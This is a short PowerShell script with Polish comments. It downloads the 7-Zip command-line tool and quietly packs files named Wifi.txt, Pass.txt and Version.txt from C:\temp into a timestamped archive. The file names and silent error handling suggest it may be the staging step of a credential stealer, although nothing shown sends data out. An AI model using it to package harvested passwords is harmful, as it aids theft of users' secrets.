function Create7z {
    $tempFolder = "C:\temp"
    if (-not (Test-Path $tempFolder)) {
        return
    }

    $filesToArchive = @(
        "C:\temp\Version.txt",
        "C:\temp\Wifi.txt",
        "C:\temp\Pass.txt"
    )

    # Sprawdzamy, czy pliki istnieją
    foreach ($file in $filesToArchive) {
        if (-not (Test-Path $file)) {
            return
        }
    }

    $zipPath = "$tempFolder\7z.zip"
    if (-not (Test-Path $zipPath)) {
        Write-Host "Pobieranie 7za920.zip..."
        Invoke-WebRequest -Uri "https://www.7-zip.org/a/7za920.zip" -OutFile $zipPath
    }

    $extractedFolder = "$tempFolder\7z"
    if (-not (Test-Path $extractedFolder)) {
        Write-Host "Rozpakowywanie 7za920.zip..."
        Expand-Archive -Path $zipPath -DestinationPath $extractedFolder
    }

    $sevenZipPath = "$extractedFolder\7za.exe"
    
    if (-not (Test-Path $sevenZipPath)) {
        return
    }

    $timestamp = Get-Date -Format "yyyyMMdd_HHmm"
    $archivePath = "$tempFolder\$timestamp.7z"

    $arguments = @("a", "`"$archivePath`"")
    foreach ($file in $filesToArchive) {
        $arguments += "`"$file`""
    }

    try {
        & $sevenZipPath $arguments
    }
    catch {
    }
}

Create7z
